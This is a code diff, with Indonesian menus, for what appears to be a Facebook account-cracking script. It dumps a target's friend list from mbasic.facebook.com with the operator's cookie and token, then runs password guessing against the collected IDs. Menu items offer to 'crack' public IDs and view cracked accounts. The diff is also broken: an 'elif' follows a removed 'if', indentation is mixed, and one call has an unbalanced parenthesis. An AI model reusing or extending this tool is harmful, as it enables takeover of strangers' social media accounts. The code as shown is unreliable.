@@ -150,18 +150,11 @@ class Main:
 		print(f" [*] Status      : {H}Premium{N}")
 		print(" [*] ---------------------------------------------")
 		print(f" [*] IP          : {self.ip}\n")
-		print(" [01]. crack dari file")
-		print(" [02]. crack dari id publik")
-		print(" [03]. lihat akun hasil crack")
+                print(" [01]. crack dari id publik")
+		print(" [02]. lihat akun hasil crack")
 		print(f" [{M}00{N}]. logout (hapus login)")
 		ask = input("\n [?] pilih : ")
-		if ask in["1","01"]:
-			fol = input("\n [*] masukan nama file : ")
-			file = open(f"{fol}","r").read().splitlines()
-			for z in file:
-				idz.append(z)
-			Crack().atursandi()
-		elif ask in["2","02"]:
+		elif ask in["1","01"]:
 			print (" [*] isi 'me' jika ingin crack dari daftar teman")
 			user = input(" [*] masukan id atau username : ")
 			self.publik(user,token,cookie)
@@ -196,15 +189,13 @@ class Crack:
 		print(f"\n\n [+] total id -> {M}{len(idz)}{N}")
 		ask = input(" [?] apakah anda ingin menggunakan sandi manual? [Y/t]:")
 		print("\n [ pilih method login - silahkan coba satu² ]\n")
-		print(" [1]. method api")
-		print(" [2]. method mobile")
-		method = input("\n [?] method : ")
-		if method in["1","01"]:
-			self.mtd.append("api")
-		elif method in["2","02"]:
-			self.mtd.append("api")
-		elif method in["3","03"]:
-			self.mtd.append("mobile")
+		elif menu in["1","01"]:
+			prints(f"""{P2}     masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=87,style=f"{color_panel}"))
+			user = console.input(f" {H2}• {P2}masukan id atau username : ")
+			if user in["Me","me"]:
+				user = Dump(cookie).GetUser()
+			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
+			Crack().atursandi()
 		for urutan in idz:
 			xx = random.randint(0,len(tampung))
 			tampung.insert(xx,urutan)
